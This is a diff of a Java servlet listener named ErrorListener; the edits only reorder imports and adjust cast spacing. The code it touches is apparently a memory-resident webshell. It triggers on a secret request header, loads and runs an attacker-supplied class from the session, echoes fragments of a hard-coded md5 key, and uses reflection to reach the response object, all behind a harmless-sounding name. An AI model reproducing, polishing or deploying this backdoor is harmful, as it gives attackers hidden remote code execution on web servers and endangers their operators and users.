@@ -1,5 +1,3 @@
-import java.io.ByteArrayOutputStream;
-import java.lang.reflect.Field;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletRequestEvent;
@@ -7,6 +5,8 @@ import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Field;
 
 public class ErrorListener extends ClassLoader implements ServletRequestListener {
     public String md5 = "4B9B4A9EEB3F82A06A5D643C57E87B54";
@@ -45,13 +45,13 @@ public class ErrorListener extends ClassLoader implements ServletRequestListener
         String value = null;
         try {
             Class<?> base64 = Class.forName("java.util.Base64");
-            Object encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
-            value = (String)encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
+            Object encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
+            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var61) {
             try {
                 Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                 Object encoder = base64.newInstance();
-                value = (String)encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
+                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
             } catch (Exception var5) {
             }
         }
@@ -64,13 +64,13 @@ public class ErrorListener extends ClassLoader implements ServletRequestListener
 
         try {
             Class<?> base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
-            value = (byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
+            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var61) {
             try {
                 Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                 Object decoder = base64.newInstance();
-                value = (byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
             } catch (Exception var5) {
             }
         }
@@ -98,7 +98,7 @@ public class ErrorListener extends ClassLoader implements ServletRequestListener
 
     @Override
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
-        HttpServletRequest request = (HttpServletRequest)servletRequestEvent.getServletRequest();
+        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
 
         try {
             if (request.getHeader(this.headerName) != null && request.getHeader(this.headerName).contains(this.headerValue)) {
@@ -111,7 +111,7 @@ public class ErrorListener extends ClassLoader implements ServletRequestListener
                 } else {
                     request.setAttribute("parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = ((Class)session.getAttribute("payload")).newInstance();
+                    Object f = ((Class) session.getAttribute("payload")).newInstance();
                     f.equals(arrOut);
                     f.equals(request);
                     response.getWriter().write(this.md5.substring(0, 16));
@@ -130,9 +130,9 @@ public class ErrorListener extends ClassLoader implements ServletRequestListener
         HttpServletResponse response = null;
 
         try {
-            response = (HttpServletResponse)getFieldValue(getFieldValue(request, "request"), "response");
+            response = (HttpServletResponse) getFieldValue(getFieldValue(request, "request"), "response");
         } catch (Exception var4) {
-            response = (HttpServletResponse)getFieldValue(request, "response");
+            response = (HttpServletResponse) getFieldValue(request, "response");
         }
 
         return response;
